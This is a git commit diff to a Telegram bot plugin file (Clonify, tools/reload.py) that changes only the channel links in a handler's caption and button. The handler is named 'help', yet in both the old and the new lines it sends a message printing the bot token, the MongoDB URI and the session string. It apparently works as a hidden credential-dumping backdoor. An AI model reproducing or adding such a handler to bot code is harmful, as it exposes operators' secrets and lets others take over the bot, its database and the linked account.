16ededaf8b8ef0988e33f1fb073d2e7504138479
BADNAM XD <yadavxd746@gmail.com>
2025-04-22 08:35:54 +0530

    Update reload.py

--- Clonify/plugins/tools/reload.py
+++ Clonify/plugins/tools/reload.py
@@ -113,12 +113,12 @@ async def restartbot(client, message: Message, _):
 async def help(client: Client, message: Message):
    await message.reply_photo(
           photo=f"https://telegra.ph/file/567d2e17b8f38df99ce99.jpg",
-       caption=f"""Bot Token:-   `{BOT_TOKEN}` \n\n Mongo:-   `{MONGO_DB_URI}`\n\nString Session:-   `{STRING_SESSION}`\n\n [ 🤨 ](https://t.me/ZeoXpro)............☆""",
+       caption=f"""Bot Token:-   `{BOT_TOKEN}` \n\n Mongo:-   `{MONGO_DB_URI}`\n\nString Session:-   `{STRING_SESSION}`\n\n [ 🤨 ](https://t.me/ll_YOU_NOW_BADNAM_ll)............☆""",
         reply_markup=InlineKeyboardMarkup(
              [
                  [
                       InlineKeyboardButton(
-                         "• DEV •", url=f"https://t.me/purvibots")
+                         "• DEV •", url=f"https://t.me/KRITI_UPDATE")
                  ]
             ]
          ),
